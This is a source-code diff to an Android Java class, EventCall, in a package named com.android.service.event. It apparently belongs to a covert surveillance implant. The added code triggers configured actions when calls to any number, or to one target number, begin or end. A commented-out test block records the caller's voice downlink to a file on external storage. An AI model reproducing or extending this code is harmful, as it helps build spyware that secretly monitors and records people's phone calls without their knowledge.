@@ -9,7 +9,11 @@
 
 package com.android.service.event;
 
+import java.io.File;
 import java.io.IOException;
+
+import android.media.MediaRecorder;
+import android.os.Environment;
 
 import com.android.service.Call;
 import com.android.service.auto.Cfg;
@@ -28,7 +32,8 @@ public class EventCall extends BaseEvent implements Observer<Call> {
 	private int actionOnExit, actionOnEnter;
 	private String number;
 	private boolean inCall = false;
-
+	private MediaRecorder recorder = null;
+	
 	@Override
 	public void actualStart() {
 		ListenerCall.self().attach(this);
@@ -43,7 +48,10 @@ public class EventCall extends BaseEvent implements Observer<Call> {
 	@Override
 	public boolean parse(ConfEvent conf) {
 		try {
-			number = conf.getString("number");
+			if (conf.has("number") == true)
+				number = conf.getString("number");
+			else
+				number = "";
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " exitAction: " + actionOnExit + " number: \"");//$NON-NLS-1$ //$NON-NLS-2$
@@ -56,8 +64,6 @@ public class EventCall extends BaseEvent implements Observer<Call> {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: params FAILED");//$NON-NLS-1$
 			}
-
-			return false;
 		}
 
 		return true;
@@ -65,15 +71,51 @@ public class EventCall extends BaseEvent implements Observer<Call> {
 
 	@Override
 	public void actualGo() {
-		// TODO Auto-generated method stub
+
 	}
 
 	public int notification(Call c) {
 		// Nel range
 		if (c.isOngoing() && inCall == false) {
+			// TEST
+			/*recorder = new MediaRecorder();
+			
+			String path = Environment.getExternalStorageDirectory().getAbsolutePath() + "/records/test3.3gp";
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (notification): " + path); //$NON-NLS-1$
+			}
+			
+			File directory = new File(path).getParentFile();
+			
+		    if (!directory.exists() && !directory.mkdirs()) {
+		    	return 0;
+		    }
+
+		    recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_DOWNLINK);
+		    recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+		    recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+		    recorder.setOutputFile(path);
+		    
+		    try {
+				recorder.prepare();
+			} catch (IllegalStateException e) {
+
+			} catch (IOException e) {
+
+			}
+			
+		    recorder.start();*/
+			// FINE TEST
+			
 			// Match any number
 			if (number.length() == 0) {
 				inCall = true;
+				
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (notification): triggering inCall"); //$NON-NLS-1$
+				}
+				
 				onEnter();
 
 				return 0;
@@ -82,6 +124,11 @@ public class EventCall extends BaseEvent implements Observer<Call> {
 			// Match a specific number
 			if (c.getNumber().contains(number)) {
 				inCall = true;
+				
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (notification): triggering inCall"); //$NON-NLS-1$
+				}
+				
 				onEnter();
 
 				return 0;
@@ -93,6 +140,16 @@ public class EventCall extends BaseEvent implements Observer<Call> {
 		if (c.isOngoing() == false && inCall == true) {
 			inCall = false;
 
+			// TEST
+			/*recorder.stop();
+		    recorder.release();
+		    recorder = null;*/
+			// FINE TEST
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (notification): triggering endCall"); //$NON-NLS-1$
+			}
+			
 			onExit();
 			return 0;
 		}
